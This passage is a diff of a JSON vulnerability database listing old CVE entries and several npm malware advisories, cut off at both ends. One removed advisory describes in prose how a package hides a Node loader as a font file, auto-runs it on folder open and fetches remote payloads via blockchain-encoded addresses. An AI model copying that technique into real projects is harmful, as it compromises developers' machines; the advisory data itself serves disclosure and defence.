+        "http://www.iss.net/security_center/static/8322.php",
+        "http://www.securityfocus.com/bid/4208",
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
+        "http://www.iss.net/security_center/static/8322.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0348",
+      "summary": "service.cgi in Cobalt RAQ 4 allows remote attackers to cause a denial of service, and possibly execute arbitrary code, via a long service argument.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
+        "http://www.iss.net/security_center/static/8323.php",
+        "http://www.securityfocus.com/bid/4209",
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
+        "http://www.iss.net/security_center/static/8323.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0349",
+      "summary": "Tiny Personal Firewall (TPF) 2.0.15, under certain configurations, will pop up an alert to the system even when the screen is locked, which could allow an attacker with physical access to the machine to hide activities or bypass access restrictions.",
       "cvssScore": 4.6,
       "severity": "Medium",
-      "published": "2003-05-12",
+      "published": "2002-06-25",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.kb.cert.org/vuls/id/446338",
-        "http://www.securityfocus.com/bid/7370",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-013",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11803",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A1264"
+        "http://marc.info/?l=bugtraq&m=101494587110288&w=2",
+        "http://www.iss.net/security_center/static/8324.php",
+        "http://www.securityfocus.com/bid/4207",
+        "http://marc.info/?l=bugtraq&m=101494587110288&w=2",
+        "http://www.iss.net/security_center/static/8324.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0113",
-      "summary": "Buffer overflow in URLMON.DLL in Microsoft Internet Explorer 5.01, 5.5 and 6.0 allows remote attackers to execute arbitrary code via an HTTP response containing long values in (1) Content-type and (2) Content-encoding fields.",
+      "id": "CVE-2002-0350",
+      "summary": "HP Procurve Switch 4000M running firmware C.08.22 and C.09.09 allows remote attackers to cause a denial of service via a port scan of the management IP address, which disables the telnet service.",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101500123900612&w=2",
+        "http://www.iss.net/security_center/static/8329.php",
+        "http://www.securityfocus.com/bid/4212",
+        "http://marc.info/?l=bugtraq&m=101500123900612&w=2",
+        "http://www.iss.net/security_center/static/8329.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0351",
+      "summary": "Buffer overflows in CFS daemon (cfsd) before 1.3.3-8.1, and 1.4x before 1.4.1-5, allow remote attackers to cause a denial of service and possibly execute arbitrary code.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-05-12",
+      "published": "2002-06-25",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=105138417416900&w=2",
-        "http://marc.info/?l=bugtraq&m=105718285107246&w=2",
-        "http://www.kb.cert.org/vuls/id/169753",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-015",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A926"
+        "http://www.debian.org/security/2002/dsa-116",
+        "http://www.iss.net/security_center/static/8330.php",
+        "http://www.securityfocus.com/bid/4219",
+        "http://www.debian.org/security/2002/dsa-116",
+        "http://www.iss.net/security_center/static/8330.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0114",
-      "summary": "The file upload control in Microsoft Internet Explorer 5.01, 5.5, and 6.0 allows remote attackers to automatically upload files from the local system via a web page containing a script to upload the files.",
+      "id": "CVE-2002-0352",
+      "summary": "Phorum 3.3.2 allows remote attackers to determine the email addresses of the 10 most active users via a direct HTTP request to the stats.php program, which does not require authentication.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-05-12",
+      "published": "2002-06-25",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=104429340817718&w=2",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-015",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A963",
-        "http://marc.info/?l=bugtraq&m=104429340817718&w=2",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-015"
+        "http://marc.info/?l=bugtraq&m=101508207206900&w=2",
+        "http://www.iss.net/security_center/static/8344.php",
+        "http://www.securityfocus.com/bid/4226",
+        "http://marc.info/?l=bugtraq&m=101508207206900&w=2",
+        "http://www.iss.net/security_center/static/8344.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0420",
-      "summary": "The default configuration of SYSKEY in Windows 2000 stores the startup key in the registry, which could allow an attacker tor ecover it and use it to decrypt Encrypted File System (EFS) data.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-05-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q2/0112.html",
-        "http://www.securityfocus.com/bid/1198",
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q2/0112.html",
-        "http://www.securityfocus.com/bid/1198"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0421",
-      "summary": "The process_bug.cgi script in Bugzilla allows remote attackers to execute arbitrary commands via shell metacharacters.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2000-05-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0128.html",
-        "http://www.securityfocus.com/bid/1199",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0128.html",
-        "http://www.securityfocus.com/bid/1199"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0439",
-      "summary": "Internet Explorer 4.0 and 5.0 allows a malicious web site to obtain client cookies from another domain by including that domain name and escaped characters in a URL, aka the \"Unauthorized Cookie Access\" vulnerability.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2000-05-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.osvdb.org/1326",
-        "http://www.securityfocus.com/bid/1194",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=20000511135609.D7774%40securityfocus.com",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=NDBBKGHPMKBKDDGLDEEHAEHMDIAA.rms2000%40bellatlantic.net",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-033"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0457",
-      "summary": "ISM.DLL in IIS 4.0 and 5.0 allows remote attackers to read file contents by requesting the file and appending a large number of encoded spaces (%20) and terminated with a .htr extension, aka the \".HTR File Fragment Reading\" or \"File Fragment Reading via .HTR\" vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2000-05-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=95810120719608&w=2",
-        "http://www.securityfocus.com/bid/1193",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-031",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4448",
-        "http://marc.info/?l=bugtraq&m=95810120719608&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0407",
-      "summary": "Buffer overflow in Solaris netpr program allows local users to execute arbitrary commands via a long -p option.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-05-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0141.html",
-        "http://www.securityfocus.com/bid/1200",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0141.html",
-        "http://www.securityfocus.com/bid/1200"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0415",
-      "summary": "Buffer overflow in Outlook Express 4.x allows attackers to cause a denial of service via a mail or news message that has a .jpg or .bmp attachment with a long file name.",
+      "id": "CVE-2002-0353",
+      "summary": "The ASN.1 parser in Ethereal 0.9.2 and earlier allows remote attackers to cause a denial of service (crash) via a certain malformed packet, which causes Ethereal to allocate memory incorrectly, possibly due to zero-length fields.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-05-12",
+      "published": "2002-06-25",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0140.html",
-        "http://www.securityfocus.com/bid/1195",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0140.html",
-        "http://www.securityfocus.com/bid/1195"
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000474",
+        "http://www.debian.org/security/2002/dsa-130",
+        "http://www.ethereal.com/appnotes/enpa-sa-00003.html",
+        "http://www.iss.net/security_center/static/8952.php",
+        "http://www.redhat.com/support/errata/RHSA-2002-088.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0400",
-      "summary": "The Microsoft Active Movie ActiveX Control in Internet Explorer 5 does not restrict which file types can be downloaded, which allows an attacker to download any type of file to a user's system by encoding it within an email message or news post.",
+      "id": "CVE-2002-0354",
+      "summary": "The XMLHttpRequest object (XMLHTTP) in Netscape 6.1 and Mozilla 0.9.7 allows remote attackers to read arbitrary files and list directories on a client system by opening a URL that redirects the browser to the file on the client, then reading the result using the responseText property.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=102017952204097&w=2",
+        "http://marc.info/?l=ntbugtraq&m=102020343728766&w=2",
+        "http://marc.info/?l=bugtraq&m=102017952204097&w=2",
+        "http://marc.info/?l=ntbugtraq&m=102020343728766&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0360",
+      "summary": "Buffer overflow in Sun AnswerBook2 1.4 through 1.4.3 allows remote attackers to execute arbitrary code via a long filename argument to the gettransbitmap CGI program.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2000-05-13",
+      "published": "2002-06-25",
       "modified": null,
-      "cwe": "CWE-20",
+      "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=95868514521257&w=2",
-        "http://www.securityfocus.com/bid/1221",
-        "http://marc.info/?l=bugtraq&m=95868514521257&w=2",
-        "http://www.securityfocus.com/bid/1221"
+        "http://marc.info/?l=bugtraq&m=102198846905064&w=2",
+        "http://marc.info/?l=vulnwatch&m=102194510509450&w=2",
+        "http://www.eSecurityOnline.com/advisories/eSO5063.asp",
+        "http://www.iss.net/security_center/static/9117.php",
+        "http://www.securityfocus.com/bid/4784"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "GHSA-2GQJ-WRF5-35W8",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package ships a.vscode/tasks.json with runOn=folderOpen, hide=true, and presentation.reveal=never that silently executes `node./public/fonts/fa-solid-500.woff2` the first time a developer opens the installed project folder in VS Code. The referenced file is not a font — it is a Node.js loader disguised alongside legitimate FontAwesome assets (weight 500 is not a real FontAwesome variant), padded with leading tabs to appear binary. When executed, the loader queries Ethereum RPCs and the eth.blockscout.com indexer for the latest transaction from the hardcoded sender 0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a, decodes the recipient-address bytes into two IPv4 C2 addresses, retrieves XOR-encoded payloads from those hosts, and runs them via eval and a detached `spawn('node', ['-e',...])`. This combines hidden auto-execution on folder open (persistence against the developer workstation), blockchain-based C2 rotation (EtherHiding), and remote code execution of arbitrary attacker-supplied Node.js.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-06-24",
-      "modified": "2026-09-09",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-2gqj-wrf5-35w8",
-        "https://www.npmjs.com/package/html-to-gutenberg/v/4.2.14",
-        "https://www.npmjs.com/package/html-to-gutenberg/v/4.2.17",
-        "https://www.npmjs.com/package/html-to-gutenberg/v/4.2.13",
-        "https://www.npmjs.com/package/html-to-gutenberg/v/4.2.18"
-      ],
-      "vulnerableProducts": [
-        "html-to-gutenberg npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-4CRW-26F5-4V62",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package was found to contain malicious code or consuming dependency that contains malicious code\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-09",
-      "modified": "2026-09-09",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-4crw-26f5-4v62",
-        "https://www.npmjs.com/package/amprem-activator/v/1.0.0",
-        "https://www.npmjs.com/package/amprem-activator/v/1.0.2",
-        "https://www.npmjs.com/package/amprem-activator/v/1.0.1"
-      ],
-      "vulnerableProducts": [
-        "amprem-activator npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-FW7G-GR3J-7WF7",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package was found to contain malicious code or consuming dependency that contains malicious code\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-09",
-      "modified": "2026-09-09",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-fw7g-gr3j-7wf7",
-        "https://www.npmjs.com/package/@versacode/baileys/v/1.4.5-beta.2",
-        "https://www.npmjs.com/package/@versacode/baileys/v/1.4.5-beta.0",
-        "https://www.npmjs.com/package/@versacode/baileys/v/1.4.5-beta.1"
-      ],
-      "vulnerableProducts": [
-        "@versacode/baileys npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0097",
-      "summary": "Geeklog 1.3 allows remote attackers to hijack user accounts, including the administrator account, by modifying the UID of a user's permanent cookie to the target account.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-03-25",
+      "id": "CVE-2000-0972",
+      "summary": "HP-UX 11.00 crontab allows local users to read arbitrary files via the -e option by creating a symlink to the target file during the crontab session, quitting the session, and reading the error messages that crontab generates.",
+      "cvssScore": 5.5,
+      "severity": "Medium",
+      "published": "2000-12-19",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-59",
       "references": [
-        "http://geeklog.sourceforge.net/index.php?topic=Security",
-        "http://online.securityfocus.com/archive/1/249443",
-        "http://www.iss.net/security_center/static/7869.php",
-        "http://www.securityfocus.com/bid/3844",
-        "http://geeklog.sourceforge.net/index.php?topic=Security"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0317.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5410",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0317.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5410"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1209",
-      "summary": "Directory traversal vulnerability in SolarWinds TFTP Server 5.0.55, and possibly earlier, allows remote attackers to read arbitrary files via \"..\\\" (dot-dot backslash) sequences in a GET request.",
+      "id": "CVE-2002-1169",
+      "summary": "IBM Web Traffic Express Caching Proxy Server 3.6 and 4.x before 4.0.1.26 allows remote attackers to cause a denial of service (crash) via an HTTP request to helpout.exe with a missing HTTP version number, which causes ibmproxy.exe to crash.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-11-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0044.html",
-        "http://www.idefense.com/advisory/10.24.02.txt",
-        "http://www.securityfocus.com/bid/6045",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10469",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0044.html"
+        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY35970&apar=only",
+        "http://www.iss.net/security_center/static/10452.php",
+        "http://www.osvdb.org/2090",
+        "http://www.rapid7.com/advisories/R7-0007.txt",
+        "http://www.securityfocus.com/bid/6002"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1230",
-      "summary": "NetDDE Agent on Windows NT 4.0, 4.0 Terminal Server Edition, Windows 2000, and Windows XP allows local users to execute arbitrary code as LocalSystem via \"shatter\" style attack by sending a WM_COPYDATA message followed by a WM_TIMER message, as demonstrated by GetAd, aka \"Flaw in Windows WM_TIMER Message Handling Could Enable Privilege Elevation.\"",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2002-11-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://getad.chat.ru/",
-        "http://www.ciac.org/ciac/bulletins/n-027.shtml",
-        "http://www.iss.net/security_center/static/10343.php",
-        "http://www.packetstormsecurity.nl/filedesc/GetAd.c.html",
-        "http://www.securityfocus.com/bid/5927"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1231",
-      "summary": "SCO UnixWare 7.1.1 and Open UNIX 8.0.0 allows local users to cause a denial of service via an rcp call on /proc.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2002-11-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenUNIX/CSSA-2002-SCO.41",
-        "http://www.iss.net/security_center/static/10425.php",
-        "http://www.securityfocus.com/bid/6025",
-        "ftp://ftp.sco.com/pub/updates/OpenUNIX/CSSA-2002-SCO.41",
-        "http://www.iss.net/security_center/static/10425.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1232",
-      "summary": "Memory leak in ypdb_open in yp_db.c for ypserv before 2.5 in the NIS package 3.9 and earlier allows remote attackers to cause a denial of service (memory consumption) via a large number of requests for a map that does not exist.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-11-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-054.0.txt",
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000539",
-        "http://marc.info/?l=bugtraq&m=103582692228894&w=2",
-        "http://online.securityfocus.com/advisories/4605",
-        "http://www.debian.org/security/2002/dsa-180"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1233",
-      "summary": "A regression error in the Debian distributions of the apache-ssl package (before 1.3.9 on Debian 2.2, and before 1.3.26 on Debian 3.0), for Apache 1.3.27 and earlier, allows local users to read or modify the Apache password file via a symlink attack on temporary files when the administrator runs (1) htpasswd or (2) htdigest, a re-introduction of a vulnerability that was originally identified and addressed by CVE-2001-0131.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2002-11-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=103480856102007&w=2",
-        "http://www.debian.org/security/2002/dsa-187",
-        "http://www.debian.org/security/2002/dsa-188",
-        "http://www.debian.org/security/2002/dsa-195",
-        "http://www.iss.net/security_center/static/10412.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0044",
-      "summary": "Macros in War FTP 1.70 and 1.67b2 allow local or remote attackers to read arbitrary files or execute commands.",
+      "id": "CVE-2002-2250",
+      "summary": "Multiple buffer overflows in Sybase Adaptive Server 12.0 and 12.5 allow remote attackers to execute arbitrary code via (1) a long parameter to the xp_freedll extended stored procedure or (2) a long database name argument to the DBCC CHECKVERIFY function.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2000-01-06",
+      "published": "2002-12-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-119",
       "references": [
-        "http://www.securityfocus.com/bid/919",
-        "http://www.securityfocus.com/bid/919"
+        "http://archives.neohapsis.com/archives/ntbugtraq/2002-q4/0080.html",
+        "http://archives.neohapsis.com/archives/ntbugtraq/2002-q4/0082.html",
+        "http://cert.uni-stuttgart.de/archive/bugtraq/2002/11/msg00361.html",
+        "http://cert.uni-stuttgart.de/archive/bugtraq/2002/11/msg00364.html",
+        "http://www.appsecinc.com/resources/alerts/sybase/02-0001.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0055",
-      "summary": "Buffer overflow in Solaris chkperm command allows local users to gain root access via a long -n option.",
+      "id": "CVE-2001-0545",
+      "summary": "IIS 4.0 with URL redirection enabled allows remote attackers to cause a denial of service (crash) via a malformed request that specifies a length that is different than the actual length.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.ciac.org/ciac/bulletins/l-132.shtml",
+        "http://www.osvdb.org/5736",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-044",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6981",
+        "http://www.ciac.org/ciac/bulletins/l-132.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0652",
+      "summary": "Heap overflow in xlock in Solaris 2.6 through 8 allows local users to gain root privileges via a long (1) XFILESEARCHPATH or (2) XUSERFILESEARCHPATH environmental variable.",
       "cvssScore": 7.2,
       "severity": "High",
-      "published": "2000-01-06",
+      "published": "2001-10-30",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/918",
-        "http://www.securityfocus.com/bid/918"
+        "http://marc.info/?l=bugtraq&m=99745571104126&w=2",
+        "http://www.securityfocus.com/bid/3160",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6967",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A10",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A131"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0084",
-      "summary": "CuteFTP uses weak encryption to store password information in its tree.dat file.",
+      "id": "CVE-2001-0660",
+      "summary": "Outlook Web Access (OWA) in Microsoft Exchange 5.5, SP4 and earlier, allows remote attackers to identify valid user email addresses by directly accessing a back-end function that processes the global address list (GAL).",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-01-06",
+      "published": "2001-10-30",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0084",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0084"
+        "http://support.microsoft.com/support/kb/articles/Q307/1/95.ASP",
+        "http://www.securityfocus.com/bid/3301",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-047",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7089",
+        "http://support.microsoft.com/support/kb/articles/Q307/1/95.ASP"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1151",
-      "summary": "Baxter IRC client in BeOS r5 pro and earlier allows remote attackers to conduct a denial of service via a message that contains a long URL.",
+      "id": "CVE-2001-0662",
+      "summary": "RPC endpoint mapper in Windows NT 4.0 allows remote attackers to cause a denial of service (loss of RPC services) via a malformed request.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "2001-10-30",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html"
+        "http://www.ciac.org/ciac/bulletins/l-142.shtml",
+        "http://www.securityfocus.com/bid/3313",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-048",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7105",
+        "http://www.ciac.org/ciac/bulletins/l-142.shtml"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1152",
-      "summary": "Browser IRC client in BeOS r5 pro and earlier allows remote attackers to conduct a denial of service via a message that contains a long URL.",
+      "id": "CVE-1999-1206",
+      "summary": "SystemSoft SystemWizard package in HP Pavilion PC with Windows 98, and possibly other platforms and operating systems, installs two ActiveX controls that are marked as safe for scripting, which allows remote attackers to execute arbitrary commands via a malicious web page that references (1) the Launch control, or (2) the RegObj control.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1999-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=93336970231857&w=2",
+        "http://www.securityfocus.com/bid/555",
+        "http://www.systemsoft.com/l-2/l-3/support-systemwizard.htm",
+        "http://marc.info/?l=bugtraq&m=93336970231857&w=2",
+        "http://www.securityfocus.com/bid/555"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1222",
+      "summary": "Netbt.sys in Windows NT 4.0 allows remote malicious DNS servers to cause a denial of service (crash) by returning 0.0.0.0 as the IP address for a DNS host name lookup.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "1999-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html"
+        "http://support.microsoft.com/support/kb/articles/Q188/5/71.ASP",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3893",
+        "http://support.microsoft.com/support/kb/articles/Q188/5/71.ASP",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3893"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1153",
-      "summary": "PostMaster 1.0 in BeOS r5 pro and earlier allows remote attackers to conduct a denial of service via a message that contains a long URL.",
+      "id": "CVE-1999-1223",
+      "summary": "IIS 3.0 allows remote attackers to cause a denial of service via a request to an ASP page in which the URL contains a large number of / (forward slash) characters.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "1999-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html"
+        "http://support.microsoft.com/support/kb/articles/q187/5/03.asp",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3892",
+        "http://support.microsoft.com/support/kb/articles/q187/5/03.asp",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3892"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1154",
-      "summary": "RHConsole in RobinHood 1.1 web server in BeOS r5 pro and earlier allows remote attackers to cause a denial of service via long HTTP request.",
+      "id": "CVE-2003-0738",
+      "summary": "The calendar module in phpWebSite 0.9.x and earlier allows remote attackers to cause a denial of service (crash) via a long year parameter.",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": "CWE-134",
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106062021711496&w=2",
+        "http://marc.info/?l=bugtraq&m=106252188522715&w=2",
+        "http://marc.info/?l=bugtraq&m=106062021711496&w=2",
+        "http://marc.info/?l=bugtraq&m=106252188522715&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0739",
+      "summary": "VMware Workstation 4.0.1 for Linux, build 5289 and earlier, allows local users to delete arbitrary files via a symlink attack.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106029217115023&w=2",
+        "http://www.vmware.com/support/kb/enduser/std_adp.php?p_faqid=1106",
+        "http://marc.info/?l=bugtraq&m=106029217115023&w=2",
+        "http://www.vmware.com/support/kb/enduser/std_adp.php?p_faqid=1106"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0740",
+      "summary": "Stunnel 4.00, and 3.24 and earlier, leaks a privileged file descriptor returned by listen(), which allows local users to hijack the Stunnel server.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000736",
+        "http://marc.info/?l=bugtraq&m=106260760211958&w=2",
+        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:108",
